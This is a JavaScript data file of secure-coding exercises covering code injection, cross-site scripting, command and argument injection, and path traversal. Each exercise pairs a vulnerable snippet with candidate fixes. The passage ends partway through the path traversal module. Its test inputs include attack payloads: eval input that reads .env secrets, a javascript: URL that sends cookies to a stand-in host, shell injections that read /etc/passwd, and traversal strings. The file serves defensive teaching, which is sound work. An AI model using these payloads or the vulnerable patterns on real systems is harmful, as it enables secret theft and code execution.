// Exercise fixtures. All code, payloads and outcomes are static strings shown as text; nothing here is executed.
// Shape: see README "Adding an exercise".
(function () {
  'use strict';

  const SRC = {
    cwe94: 'https://cwe.mitre.org/data/definitions/94.html',
    cwe95: 'https://cwe.mitre.org/data/definitions/95.html',
    cwe79: 'https://cwe.mitre.org/data/definitions/79.html',
    cwe78: 'https://cwe.mitre.org/data/definitions/78.html',
    cwe88: 'https://cwe.mitre.org/data/definitions/88.html',
    cwe22: 'https://cwe.mitre.org/data/definitions/22.html',
    code: 'https://owasp.org/www-community/attacks/Code_Injection',
    xss: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
    cmd: 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html',
    path: 'https://owasp.org/www-community/attacks/Path_Traversal',
  };

  const modules = [
    {
      id: 'm94',
      nav: 'Code generation',
      cwe: 'CWE-94',
      title: 'Code injection',
      intro: 'Find request text that the app compiles or evaluates as code.',
      links: [
        ['MITRE CWE-94: Improper Control of Generation of Code', SRC.cwe94],
        ['MITRE CWE-95: Eval Injection (child of CWE-94)', SRC.cwe95],
        ['OWASP Code Injection', SRC.code],
      ],
      // Beginner first screen. Outcomes are fixed strings; nothing runs.
      basics: {
        lesson: 'Never run user text as code.',
        problem: 'The calculator reads expr from the URL and passes it to eval(). Anyone who controls expr can make the server run JavaScript.',
        line: 'eval() is the sink, the operation that uses the input. It runs expr as JavaScript with the server\'s access.',
        works: 'Anything other than "number + or * number" gets 400 before any code runs. OPS can only add or multiply.',
        unsafe: {
          code: "const expr = req.query.expr;   // \"2 + 3\"\nres.send(String(eval(expr)));",
          hot: 1,
        },
        fixed: {
          code: [
            'const m = /^(\\d+) ([+*]) (\\d+)$/.exec(req.query.expr);',
            'if (!m) return res.sendStatus(400);',
            "const OPS = { '+': (a, b) => a + b, '*': (a, b) => a * b };",
            'res.send(String(OPS[m[2]](Number(m[1]), Number(m[3]))));',
          ].join('\n'),
          hot: 1,
        },
        samples: [
          {
            kind: 'Ordinary',
            input: '2 + 3',
            unsafe: { op: 'eval runs the text as JavaScript', out: '5', effect: 'ok' },
            fixed: { op: 'Matches "number op number"; calls OPS["+"]', out: '5', effect: 'ok' },
          },
          {
            kind: 'Harmful',
            input: "require('fs').readFileSync('.env')",
            unsafe: { op: 'eval runs the text as JavaScript', out: 'Server secrets from .env sent back', effect: 'harm' },
            fixed: { op: 'Does not match "number op number"', out: '400 Bad Request: nothing ran', effect: 'blocked' },
          },
        ],
      },
      exercises: [
        {
          id: 'm94-promo',
          title: 'Promo rule preview',
          scenario: 'Managers type a discount rule to preview their cart\'s rate.',
          alert: { rule: 'js/dynamic-code-from-request', severity: 'High', location: 'reports/discount.js:4', message: 'Request body reaches the Function constructor.' },
          lang: 'JavaScript (Node/Express)',
          code: [
            '// reports/discount.js',
            "app.post('/api/promo/preview', requireLogin, (req, res) => {",
            '  const rule = req.body.rule;       // e.g. "cart.total > 80 ? 0.15 : 0"',
            "  const calc = new Function('cart', 'return (' + rule + ');');",
            '  res.json({ rate: calc(req.session.cart) });',
            '});',
          ].join('\n'),
          source: { options: ['req.session.cart — server-side session', 'requireLogin — session check on the route', 'req.body.rule — request body', 'res.json response body'], answer: 2 },
          sink: { options: ['res.json serialises the result', 'new Function(...) call', 'requireLogin reads the session cookie', 'req.session.cart property read'], answer: 1 },
          control: { options: ['Missing CSRF token on the JSON preview POST', 'No per-user rate limit on /api/promo/preview', 'Missing Content-Type on the response', 'No rule allowlist or constrained grammar'], answer: 3 },
          cls: 'confirmed',
          cwe: 'CWE-94, specifically its child CWE-95 (Eval Injection)',
          worked: [
            'Evidence: req.body.rule is concatenated into source text and compiled by new Function, so any logged-in manager (or stolen session) runs code as the server.',
            'CWE-95 is the child of CWE-94 for input reaching eval() or the Function constructor. Blocklists miss new syntax and node:vm is not a security boundary; stop evaluating text.',
          ],
          model: {
            impact: 'Server-side code execution: read process.env secrets, call internal services, run commands as the app user.',
            ticket: 'Replace new Function in /api/promo/preview with named rule handlers or a small parser (numbers, cart fields, comparisons, ?:). Reject unknown rules with 400.',
            verification: 'A 90.00 cart still gets 0.15; the env-reading and constructor-escape payloads get 400; no eval, new Function or vm call remains on request paths.',
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: 'cart.total > 80 ? 0.15 : 0   (cart total 90.00)' },
              { kind: 'Exploit', input: 'process.env.DB_PASSWORD' },
              { kind: 'Exploit', input: "this.constructor.constructor('return process')().env.DB_PASSWORD" },
            ],
            options: [
              {
                label: 'Blocklist words like require and child_process, then compile',
                code: [
                  'const rule = req.body.rule;',
                  'if (/require|child_process|import/.test(rule)) return res.sendStatus(400);',
                  "const calc = new Function('cart', 'return (' + rule + ');');",
                  'res.json({ rate: calc(req.session.cart) });',
                ].join('\n'),
                results: [
                  { out: '{"rate":0.15}', pass: true },
                  { out: '{"rate":"<database password>"} — not on the blocklist', pass: false },
                  { out: '{"rate":"<database password>"} — not on the blocklist', pass: false },
                ],
              },
              {
                label: 'Run the text inside vm.runInNewContext with an empty context',
                code: [
                  "const vm = require('node:vm');",
                  'const rate = vm.runInNewContext(req.body.rule, { cart: req.session.cart });',
                  'res.json({ rate });',
                ].join('\n'),
                results: [
                  { out: '{"rate":0.15}', pass: true },
                  { out: 'ReferenceError: process is not defined', pass: true },
                  { out: '{"rate":"<database password>"} — constructor chain escapes the context; node:vm is not a security boundary', pass: false },
                ],
              },
              {
                label: 'Fixed handler table selected by rule name',
                code: [
                  'const RULES = {',
                  '  none: () => 0,',
                  '  over80: (cart) => (cart.total > 80 ? 0.15 : 0),',
                  '  bulk10: (cart) => (cart.items >= 10 ? 0.1 : 0),',
                  '};',
                  'const id = req.body.ruleId;',
                  'if (!Object.hasOwn(RULES, id)) return res.status(400).json({ error: "unknown rule" });',
                  'res.json({ rate: RULES[id](req.session.cart) });',
                ].join('\n'),
                results: [
                  { out: 'ruleId "over80" → {"rate":0.15}', pass: true },
                  { out: '400 unknown rule', pass: true },
                  { out: '400 unknown rule', pass: true },
                ],
              },
              {
                label: 'Constrained expression parser (tokens: numbers, cart.total, cart.items, comparisons, ? :)',
                code: [
                  'let ast;',
                  'try { ast = parsePromo(req.body.rule); }   // tokenizer rejects every other token',
                  'catch (e) { return res.status(400).json({ error: e.message }); }',
                  'res.json({ rate: evalPromoAst(ast, req.session.cart) });   // tree walk, never compiled',
                ].join('\n'),
                results: [
                  { out: '{"rate":0.15}', pass: true },
                  { out: "400 unexpected token 'process'", pass: true },
                  { out: "400 unexpected token 'this'", pass: true },
                ],
              },
            ],
          },
        },
      ],
    },
    {
      id: 'm79',
      nav: 'Cross-site scripting',
      cwe: 'CWE-79',
      title: 'Cross-site scripting',
      intro: 'Reflected, stored and DOM-based: each output context needs its own protection.',
      links: [
        ['MITRE CWE-79: Improper Neutralization of Input During Web Page Generation', SRC.cwe79],
        ['OWASP Cross Site Scripting Prevention Cheat Sheet', SRC.xss],
      ],
      basics: {
        lesson: 'Insert user text as text, not HTML. Rich HTML needs a sanitizer (see Practice).',
        problem: 'The banner reads name from the URL and writes it with innerHTML. A link with HTML in name runs the attacker\'s script as the visitor, on this site.',
        line: 'innerHTML parses name as HTML, so a tag in it becomes a real element.',
        works: 'textContent inserts name as plain text, so a tag shows as characters and nothing runs.',
        unsafe: {
          code: "const name = params.get('name');\nhello.innerHTML = 'Hi ' + name;",
          hot: 1,
        },
        fixed: {
          code: "const name = params.get('name');\nhello.textContent = 'Hi ' + name;",
          hot: 1,
        },
        samples: [
          {
            kind: 'Ordinary',
            input: 'Ana',
            unsafe: { op: 'innerHTML parses the string as HTML', out: 'Hi Ana', effect: 'ok' },
            fixed: { op: 'textContent makes one text node', out: 'Hi Ana', effect: 'ok' },
          },
          {
            kind: 'Harmful',
            input: '<img src=x onerror=alert(1)>',
            unsafe: { op: 'innerHTML parses the string as HTML', out: 'Browser builds an <img>; its onerror script runs', effect: 'harm' },
            fixed: { op: 'textContent makes one text node', out: 'Hi <img src=x onerror=alert(1)>   (shown as plain text)', effect: 'blocked' },
          },
        ],
      },
      exercises: [
        {
          id: 'm79-reflected',
          title: 'Reflected: search results page',
          scenario: 'Catalog search echoes the term in the server-rendered page.',
          alert: { rule: 'js/reflected-html', severity: 'Medium', location: 'search.js:5', message: 'Query parameter written to HTML without encoding.' },
          lang: 'JavaScript (Node/Express)',
          code: [
            '// search.js',
            "app.get('/search', (req, res) => {",
            "  const q = String(req.query.q || '');",
            '  const hits = catalog.find(q);',
            '  res.send(`<h1>Results</h1><p>${hits.length} matches for ${q}</p>`);',
            '});',
          ].join('\n'),
          source: { options: ['catalog.find(q) — rows from the catalog database', 'req.query.q — URL query string', 'hits.length — match count', 'The <h1>Results</h1> literal'], answer: 1 },
          sink: { options: ['catalog.find(q) — search query against the catalog', "String(req.query.q || '') conversion", 'app.get route handler registration', 'res.send(`...${q}...`)'], answer: 3 },
          control: { options: ['No HTML-context output encoding of q', 'Missing input length limit', 'Missing CSRF token', 'Search is not authenticated'], answer: 0 },
          cls: 'confirmed',
          cwe: 'CWE-79 (reflected, Type 1)',
          worked: [
            'Evidence: q from the URL goes raw between HTML tags in res.send, so a crafted link runs the attacker\'s markup in this site\'s origin.',
            'HTML body text needs HTML entity encoding, best from an auto-escaping template. A sanitizer is for rich HTML: it removes the <vector> in "C++ <vector> header" and does not cover URL, JavaScript or CSS contexts.',
          ],
          model: {
            impact: 'Script in our origin for anyone who opens a crafted link: session actions, data theft, in-page phishing.',
            ticket: 'Render /search with the auto-escaping template engine; remove string-built HTML from search.js.',
            verification: '"C++ <vector> header" displays exactly; the img/onerror payload shows as text and no handler runs.',
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: 'C++ <vector> header' },
              { kind: 'Exploit', input: '<img src=x onerror=alert(document.domain)>' },
            ],
            options: [
              {
                label: 'Strip <script> tags with a regular expression',
                code: "const q = String(req.query.q || '').replace(/<\\/?script[^>]*>/gi, '');\nres.send(`<h1>Results</h1><p>${hits.length} matches for ${q}</p>`);",
                results: [
                  { out: 'Displays: 3 matches for C++ header — "<vector>" is parsed as an unknown element, not shown (data changed)', pass: false },
                  { out: 'img element created; onerror handler runs', pass: false },
                ],
              },
              {
                label: 'Auto-escaping template (HTML entity encoding)',
                code: "res.render('search', { q, count: hits.length });\n\n<!-- views/search.html -->\n<h1>Results</h1><p>{{count}} matches for {{q}}</p>",
                results: [
                  { out: 'Displays: 3 matches for C++ <vector> header', pass: true },
                  { out: 'Displays the payload as text: &lt;img src=x ...&gt;', pass: true },
                ],
              },
              {
                label: 'Pass the term through an HTML sanitizer',
                code: "const q = DOMPurify.sanitize(String(req.query.q || ''));\nres.send(`<h1>Results</h1><p>${hits.length} matches for ${q}</p>`);",
                results: [
                  { out: 'Displays: 3 matches for C++ header — the unknown <vector> element is removed (data changed)', pass: false },
                  { out: 'onerror attribute removed', pass: true },
                ],
              },
            ],
          },
        },
        {
          id: 'm79-stored',
          title: 'Stored: profile website link',
          scenario: 'Users save a website URL that shows as a link on their public profile.',
          alert: { rule: 'tmpl/stored-url-attribute', severity: 'Medium', location: 'views/profile.ejs:3', message: 'Stored user field rendered into an href attribute.' },
          lang: 'EJS template',
          code: [
            '<!-- views/profile.ejs  (user.website saved earlier via POST /settings) -->',
            '<h2><%= user.displayName %></h2>',
            '<a class="site" href="<%= user.website %>">Website</a>',
          ].join('\n'),
          source: { options: ['user.displayName — rendered with <%= %> in the <h2>', 'The class="site" literal', 'The EJS <%= %> output tag', 'user.website — saved via POST /settings'], answer: 3 },
          sink: { options: ['href attribute of the anchor', '<h2> text content (HTML-escaped by <%= %>)', 'class attribute (constant "site")', 'EJS template cache'], answer: 0 },
          control: { options: ['No HTML attribute escaping at all', 'Missing CSRF token on /settings', 'No URL scheme allowlist', 'Missing max length on displayName'], answer: 2 },
          cls: 'confirmed',
          cwe: 'CWE-79 (stored, Type 2)',
          worked: [
            'Evidence: user.website is saved once and rendered into href for every visitor. <%= %> escapes quotes, so breakout fails, but a javascript: URL is still a valid href and runs on click.',
            'URL attributes need URL validation: parse, allow only http:/https:, then attribute-encode. Style values need a fixed property and allowlisted value; script data goes in as data, never into script source or event-handler attributes.',
          ],
          model: {
            impact: 'Any visitor who clicks runs script in our origin; one stored payload hits many users without a crafted link.',
            ticket: 'On save and render, parse website with new URL(), allow only http:/https:, store the normalised href; keep attribute encoding.',
            verification: 'https://ana.example/portfolio still links; javascript: and data: URLs are rejected and not linked; the quote-breakout payload stays inside href.',
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: 'https://ana.example/portfolio' },
              { kind: 'Exploit', input: "javascript:fetch('//collect.example/?c='+document.cookie)" },
              { kind: 'Exploit', input: '" onmouseover="alert(1)' },
            ],
            options: [
              {
                label: 'Keep current <%= %> attribute escaping only',
                code: '<a class="site" href="<%= user.website %>">Website</a>',
                results: [
                  { out: 'Link to https://ana.example/portfolio', pass: true },
                  { out: 'href="javascript:..." — runs when clicked', pass: false },
                  { out: 'Quotes encoded; stays inside href', pass: true },
                ],
              },
              {
                label: 'Parse with URL(), allow only http:/https:, then attribute-encode',
                code: [
                  'function safeHref(value) {',
                  '  let u;',
                  "  try { u = new URL(value); } catch { return null; }",
                  "  return u.protocol === 'https:' || u.protocol === 'http:' ? u.href : null;",
                  '}',
                  '<% const href = safeHref(user.website); %>',
                  '<% if (href) { %><a class="site" href="<%= href %>">Website</a><% } %>',
                ].join('\n'),
                results: [
                  { out: 'Link to https://ana.example/portfolio', pass: true },
                  { out: 'Rejected: protocol javascript: not allowed; no link rendered', pass: true },
                  { out: 'Rejected: not a valid absolute URL; no link rendered', pass: true },
                ],
              },
              {
                label: 'Add a Content-Security-Policy header only',
                code: "res.set('Content-Security-Policy', \"script-src 'self' 'unsafe-inline'\");\n<a class=\"site\" href=\"<%= user.website %>\">Website</a>",
                results: [
                  { out: 'Link to https://ana.example/portfolio', pass: true },
                  { out: "Still runs: this policy allows inline script. CSP is defense in depth, not the fix", pass: false },
                  { out: 'Quotes encoded; stays inside href', pass: true },
                ],
              },
            ],
          },
        },
        {
          id: 'm79-dom',
          title: 'DOM-based: welcome banner',
          scenario: 'Client script greets the user by a name from the page URL. The payload never appears in the server\'s HTML.',
          alert: { rule: 'js/dom-html-sink', severity: 'Medium', location: 'public/welcome.js:3', message: 'location.search flows to innerHTML.' },
          lang: 'JavaScript (browser)',
          code: [
            '// public/welcome.js',
            "const name = new URLSearchParams(location.search).get('name') ?? 'friend';",
            "document.querySelector('#hello').innerHTML = 'Welcome back, ' + name + '!';",
          ].join('\n'),
          source: { options: ['location.search — page URL query', "The 'friend' fallback when name is absent", '#hello element — greeting container', 'document.querySelector lookup'], answer: 0 },
          sink: { options: ['URLSearchParams.get', "'Welcome back, ' + name concatenation", 'innerHTML assignment', 'querySelector lookup'], answer: 2 },
          control: { options: ['Missing server-side HTML encoding of name', 'textContent not used for plain text', 'Missing HttpOnly flag on the session cookie', 'Missing input length limit'], answer: 1 },
          cls: 'confirmed',
          cwe: 'CWE-79 (DOM-based, Type 0)',
          worked: [
            'Evidence: location.search and innerHTML are both in the browser, so server-side encoding never sees this flow. The fix belongs in welcome.js.',
            'textContent never parses HTML, so do not pre-encode. Replacing only the first "<" leaves the rest, and URL-encoding is for URLs, not HTML.',
          ],
          model: {
            impact: 'A crafted link runs script in our origin for any signed-in user who opens it.',
            ticket: 'Write the welcome.js greeting with textContent; lint against innerHTML with non-constant values.',
            verification: "Ana O'Neil & co displays exactly; the double-< img payload shows as text and creates no element.",
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: "Ana O'Neil & co" },
              { kind: 'Exploit', input: '<<img src=x onerror=alert(document.domain)>' },
            ],
            options: [
              {
                label: 'Replace "<" with &lt; using String.replace',
                code: "const safe = name.replace('<', '&lt;');\ndocument.querySelector('#hello').innerHTML = 'Welcome back, ' + safe + '!';",
                results: [
                  { out: "Welcome back, Ana O'Neil & co!", pass: true },
                  { out: 'Only the first < is replaced; img element created and onerror runs', pass: false },
                ],
              },
              {
                label: 'encodeURIComponent the name, keep innerHTML',
                code: "document.querySelector('#hello').innerHTML = 'Welcome back, ' + encodeURIComponent(name) + '!';",
                results: [
                  { out: "Welcome back, Ana%20O'Neil%20%26%20co! — wrong encoding for HTML text", pass: false },
                  { out: 'Payload shown percent-encoded; no element created', pass: true },
                ],
              },
              {
                label: 'Use textContent',
                code: "document.querySelector('#hello').textContent = 'Welcome back, ' + name + '!';",
                results: [
                  { out: "Welcome back, Ana O'Neil & co!", pass: true },
                  { out: 'Payload shown as literal text; no element created', pass: true },
                ],
              },
            ],
          },
        },
      ],
    },
    {
      id: 'm78',
      nav: 'OS commands',
      cwe: 'CWE-78',
      title: 'OS command injection',
      intro: 'A shell lets input add commands. Without a shell, the program can still read input as options.',
      links: [
        ['MITRE CWE-78: OS Command Injection', SRC.cwe78],
        ['MITRE CWE-88: Argument Injection', SRC.cwe88],
        ['OWASP OS Command Injection Defense Cheat Sheet', SRC.cmd],
      ],
      basics: {
        lesson: 'Skip the shell and accept only values you expect.',
        problem: 'The status page reads host from the URL and appends it to a ping command run by a shell. A host with ";" adds a second command; one starting with "-" adds ping options.',
        line: 'exec() hands the whole line to a shell, which runs each ";"-separated part as a command.',
        works: 'Only hosts on the server\'s list get through; anything else gets 400. execFile() then runs ping with no shell, passing host as one argument.',
        unsafe: {
          code: "const host = req.query.host;   // \"web-1\"\nexec('ping -c 1 ' + host);",
          hot: 1,
        },
        fixed: {
          code: [
            "const HOSTS = new Set(['web-1', 'web-2']);",
            'const host = req.query.host;',
            'if (!HOSTS.has(host)) return res.sendStatus(400);',
            "execFile('ping', ['-c', '1', host]);   // no shell",
          ].join('\n'),
          hot: 2,
        },
        samples: [
          {
            kind: 'Ordinary',
            input: 'web-1',
            unsafe: { op: 'Shell runs: ping -c 1 web-1', out: 'ping runs: 1 packet received from web-1', effect: 'ok' },
            fixed: { op: 'web-1 is on the list; ping gets it as one argument', out: 'ping runs: 1 packet received from web-1', effect: 'ok' },
          },
          {
            kind: 'Harmful',
            input: 'web-1; cat /etc/passwd',
            unsafe: { op: 'Shell splits at ";" and runs a second command', out: 'Shell also runs cat /etc/passwd as the app user', effect: 'harm' },
            fixed: { op: 'Not on the list', out: '400 Bad Request: no command ran', effect: 'blocked' },
          },
          {
            kind: 'Harmful',
            input: '-f web-1',
            unsafe: { op: 'ping parses -f as an option, not a hostname', out: 'Attacker changes ping options (still limited by -c 1)', effect: 'harm' },
            fixed: { op: 'Not on the list (options never reach ping)', out: '400 Bad Request: no command ran', effect: 'blocked' },
          },
        ],
      },
      exercises: [
        {
          id: 'm78-lookup',
          title: 'Support tool: hostname lookup',
          scenario: 'Support staff paste a customer hostname to check it resolves.',
          alert: { rule: 'js/shell-command-from-request', severity: 'Critical', location: 'tools/netcheck.js:4', message: 'Query parameter concatenated into an exec command line.' },
          lang: 'JavaScript (Node/Express)',
          code: [
            '// tools/netcheck.js',
            "const { exec } = require('node:child_process');",
            "app.get('/support/resolve', requireStaff, (req, res) => {",
            "  exec('nslookup ' + req.query.host, (err, out) => res.type('text').send(String(out)));",
            '});',
          ].join('\n'),
          source: { options: ['The "nslookup " literal', 'requireStaff — staff-only access check', 'req.query.host — query string', 'out — nslookup stdout returned to the client'], answer: 2 },
          sink: { options: ['res.type("text").send(...)', 'require("node:child_process")', 'String(out) on the callback output', "exec('nslookup ' + ...)"], answer: 3 },
          control: { options: ['Missing HTML encoding of out', 'Shell parses host; no dns library call', 'No rate limit on /support/resolve', 'No audit log of staff lookups'], answer: 1 },
          cls: 'confirmed',
          cwe: 'CWE-78 (OS Command Injection)',
          worked: [
            'Evidence: req.query.host is concatenated into exec, which runs /bin/sh, so ; $( ) | && and backticks start new commands as the app user.',
            'Best fix: no OS command; dns.promises.lookup does the job. Dropping the shell alone is not enough: nslookup reads -timeout=3600 as an option, not a hostname (argument injection, CWE-88).',
          ],
          model: {
            impact: 'Arbitrary commands as the app user: read secrets, pivot to internal hosts, tamper with the deployment.',
            ticket: 'Replace exec(nslookup) with dns.promises.lookup after hostname validation (letters, digits, hyphens, dots, max 253, no leading "-"); 400 otherwise.',
            verification: 'status.example.com resolves; ;, $( ) and option-shaped input get 400; netcheck.js no longer imports child_process.',
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: 'status.example.com' },
              { kind: 'Exploit', input: 'example.com; cat /etc/passwd' },
              { kind: 'Exploit', input: 'x$(id>/tmp/p)' },
              { kind: 'Exploit', input: '-timeout=3600' },
            ],
            options: [
              {
                label: 'Strip ; & | characters, keep exec',
                code: "const host = String(req.query.host).replace(/[;&|]/g, '');\nexec('nslookup ' + host, (err, out) => res.type('text').send(String(out)));",
                results: [
                  { out: 'Address: 203.0.113.10', pass: true },
                  { out: 'Becomes "nslookup example.com cat /etc/passwd": extra arguments change the query', pass: false },
                  { out: '$( ) not stripped: id runs, /tmp/p written', pass: false },
                  { out: 'Read as an option, not a hostname: changes the resolver timeout policy; slow lookups could tie up workers (possible resource exhaustion)', pass: false },
                ],
              },
              {
                label: 'execFile("/usr/bin/nslookup", [host]) with no validation',
                code: "execFile('/usr/bin/nslookup', [String(req.query.host)],\n  (err, out) => res.type('text').send(String(out)));",
                results: [
                  { out: 'Address: 203.0.113.10', pass: true },
                  { out: 'One literal argument, no shell: lookup fails, nothing else runs', pass: true },
                  { out: 'Literal argument, no shell: lookup fails', pass: true },
                  { out: 'No shell needed: nslookup reads it as an option that changes the resolver timeout policy, not a hostname; slow lookups could tie up workers (possible resource exhaustion)', pass: false },
                ],
              },
              {
                label: 'Library call dns.promises.lookup after hostname validation',
                code: [
                  "const dns = require('node:dns').promises;",
                  'const HOST = /^(?=.{1,253}$)([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\\.)+[a-z]{2,63}$/i;',
                  'const host = String(req.query.host);',
                  "if (!HOST.test(host)) return res.status(400).send('invalid hostname');",
                  'const { address } = await dns.lookup(host);',
                  "res.type('text').send(address);",
                ].join('\n'),
                results: [
                  { out: '203.0.113.10', pass: true },
                  { out: '400 invalid hostname', pass: true },
                  { out: '400 invalid hostname', pass: true },
                  { out: '400 invalid hostname', pass: true },
                ],
              },
            ],
          },
        },
        {
          id: 'm78-gitlog',
          title: 'Release notes: git history without a shell',
          scenario: 'A user picks a release tag and gets the last 50 commit subjects. No shell is involved.',
          alert: { rule: 'js/process-arg-from-request', severity: 'High', location: 'notes.js:5', message: 'Request value passed as a process argument.' },
          lang: 'JavaScript (Node/Express)',
          code: [
            '// notes.js',
            "const { execFile } = require('node:child_process');",
            "app.get('/notes', requireLogin, (req, res) => {",
            '  const ref = String(req.query.ref);          // e.g. "v2.4.1"',
            "  execFile('git', ['log', '--oneline', '-n', '50', ref], { cwd: REPO },",
            "    (err, out) => (err ? res.sendStatus(404) : res.type('text').send(out)));",
            '});',
          ].join('\n'),
          source: { options: ['REPO — repository directory constant', 'req.query.ref — query string', "'--oneline' / '-n 50' literal flags", 'out — git log output'], answer: 1 },
          sink: { options: ['ref as a git log argv element', 'A shell parses ref before git runs', 'res.sendStatus(404) on error', 'res.type("text").send(out)'], answer: 0 },
          control: { options: ['No shell escaping or quoting of ref before execFile', 'Missing HTML output encoding of out', 'Missing CSRF token', 'No tag allowlist or --end-of-options'], answer: 3 },
          cls: 'confirmed',
          cwe: 'CWE-88 (Argument Injection), related to CWE-78',
          worked: [
            'Evidence: execFile passes ref unchecked into git\'s argv. With no shell, ; and $( ) are inert, but a ref starting with "-" is an option: --output=<file> writes the log over any file the app user can write.',
            'That is CWE-88: the attacker changes what the intended command does instead of starting a new one. Allowlist known tags, keep flags fixed in code, and pass --end-of-options before ref.',
          ],
          model: {
            impact: 'Overwrite any file the app user can write, such as a public page or config, with possible code execution.',
            ticket: 'In /notes accept only refs in the cached tag list; pass ["log","--oneline","-n","50","--end-of-options", ref]; 400 otherwise.',
            verification: 'v2.4.1 returns notes; --output=... and any value starting with "-" get 400; no file is written.',
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: 'v2.4.1' },
              { kind: 'Exploit', input: '--output=/srv/app/public/index.html' },
            ],
            options: [
              {
                label: 'No change: it already avoids the shell',
                code: "execFile('git', ['log', '--oneline', '-n', '50', ref], { cwd: REPO }, ...)",
                results: [
                  { out: '50 commit subjects', pass: true },
                  { out: 'git treats it as an option: public/index.html overwritten with the log', pass: false },
                ],
              },
              {
                label: 'Wrap ref in double quotes',
                code: "execFile('git', ['log', '--oneline', '-n', '50', '\"' + ref + '\"'], { cwd: REPO }, ...)",
                results: [
                  { out: '404: no shell removes the quotes, so ref "\\"v2.4.1\\"" is not found', pass: false },
                  { out: 'Quoted literal is not a known ref: 404', pass: true },
                ],
              },
              {
                label: 'Allowlist known tags and add --end-of-options',
                code: [
                  'if (!KNOWN_TAGS.has(ref)) return res.sendStatus(400);   // refreshed from `git tag --list` at deploy',
                  "execFile('git', ['log', '--oneline', '-n', '50', '--end-of-options', ref], { cwd: REPO }, ...)",
                ].join('\n'),
                results: [
                  { out: '50 commit subjects', pass: true },
                  { out: '400: not a known tag', pass: true },
                ],
              },
            ],
          },
        },
      ],
    },
    {
      id: 'm22',
      nav: 'Path traversal',
      cwe: 'CWE-22',
      title: 'Path traversal',
      intro: 'Check ../, absolute paths, extra decoding, sibling folders that share a prefix, and links that point outside.',
      links: [
        ['MITRE CWE-22: Improper Limitation of a Pathname to a Restricted Directory', SRC.cwe22],
        ['OWASP Path Traversal', SRC.path],
      ],
      basics: {
        lesson: 'Do not build file paths from user text; look names up in a server-owned list.',
        problem: 'The download page joins name from the URL onto /srv/files and sends that file. Each ../ climbs one folder, so name can reach any file the server can read.',
        line: 'path.join() resolves ../ in name, so the path sendFile() opens can leave /srv/files.',
        works: 'name is only a lookup key: unknown names get 404, and the path comes from the server\'s own entry.',
        unsafe: {
          code: "const file = path.join('/srv/files', req.query.name);\nres.sendFile(file);",
          hot: 0,
        },
        fixed: {
          code: [
            "const FILES = new Map([['report.pdf', 'a91f.pdf']]);   // set by the server",
            'const stored = FILES.get(req.query.name);',
            'if (!stored) return res.sendStatus(404);',
            "res.sendFile(path.join('/srv/files', stored));",
          ].join('\n'),
          hot: 1,
        },
        samples: [
          {
            kind: 'Ordinary',
            input: 'report.pdf',
            unsafe: { op: 'Path becomes /srv/files/report.pdf', out: 'report.pdf downloaded', effect: 'ok' },
            fixed: { op: 'Map has report.pdf → a91f.pdf', out: 'report.pdf downloaded', effect: 'ok' },
          },
          {
            kind: 'Harmful',
            input: '../../etc/passwd',
            unsafe: { op: 'Each ../ climbs up: path becomes /etc/passwd', out: 'The server\'s /etc/passwd downloaded', effect: 'harm' },
            fixed: { op: 'Map has no such key; no path is built', out: '404 Not Found', effect: 'blocked' },
          },
        ],
      },
      exercises: [
        {
          id: 'm22-invoice',
          title: 'Invoice download',
          scenario: 'Customers download invoice PDFs by name. The framework already decodes query values once.',
          alert: { rule: 'js/path-from-request', severity: 'High', location: 'files.js:6', message: 'Query parameter builds a file path for fs.readFile.' },
          lang: 'JavaScript (Node/Express)',
          code: [
            '// files.js',
            "const BASE = '/srv/invoices';",
            "app.get('/invoice', requireLogin, async (req, res) => {",
            '  const name = decodeURIComponent(req.query.file);   // second decode',
            '  const full = path.resolve(BASE, name);',
            "  res.type('pdf').send(await fs.readFile(full));",
            '});',
          ].join('\n'),
          source: { options: ["BASE — '/srv/invoices' constant", 'requireLogin — customer session check', "res.type('pdf')", 'req.query.file — query string'], answer: 3 },
          sink: { options: ['decodeURIComponent — second decode', "res.type('pdf').send(...)", 'fs.readFile(full)', 'requireLogin middleware'], answer: 2 },
          control: { options: ['No containment check after a double decode', 'Missing Content-Disposition: attachment header', 'No rate limit on /invoice downloads', 'Missing CSRF token'], answer: 0 },
          cls: 'confirmed',
          cwe: 'CWE-22 (Path Traversal)',
          worked: [
            'Evidence: file is decoded a second time and passed to path.resolve(BASE, …). ../ climbs out, an absolute path replaces BASE, and the extra decode turns %252e%252e%252f into ../.',
            'Best: look up a server-managed invoice ID owned by this customer. If a name is unavoidable, decode once, take the realpath, and check containment with path.relative, not a string prefix: /srv/invoices-archive starts with /srv/invoices.',
            'Caveat: a link swapped between check and read (TOCTOU) beats realpath. Do not let users create links, and use no-follow APIs where available.',
          ],
          model: {
            impact: 'Read any file the app user can read: other customers\' invoices, .env secrets, source, system files.',
            ticket: 'Replace ?file= with ?id= mapped to invoices owned by req.user; read path.join(BASE, row.storedName); drop the extra decodeURIComponent.',
            verification: 'Own invoice downloads; relative, absolute, double-encoded, sibling-prefix, symlink and malformed inputs get 404/400; another customer\'s id gets 404.',
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: '2026-10/INV-1042.pdf' },
              { kind: 'Exploit', input: '....//....//etc/passwd' },
              { kind: 'Exploit', input: '/etc/shadow' },
              { kind: 'Exploit', input: '%2e%2e%2fapp%2f.env   (sent as %252e%252e%252fapp%252f.env)' },
              { kind: 'Exploit', input: '../invoices-archive/acme-2025.pdf' },
              { kind: 'Exploit', input: '2026-10/latest/hostname   (latest is a symlink to /etc)' },
              { kind: 'Exploit', input: '%E0%A4%A   (malformed escape)' },
            ],
            options: [
              {
                label: "Remove '../' with replaceAll",
                code: "const name = decodeURIComponent(req.query.file).replaceAll('../', '');\nconst full = path.resolve(BASE, name);",
                results: [
                  { out: 'PDF returned', pass: true },
                  { out: 'Single pass leaves ../../etc/passwd: file returned', pass: false },
                  { out: 'Absolute path: path.resolve ignores BASE, /etc/shadow read attempted', pass: false },
                  { out: 'Decoded twice to ../app/.env, then stripped to app/.env inside BASE: 404', pass: true },
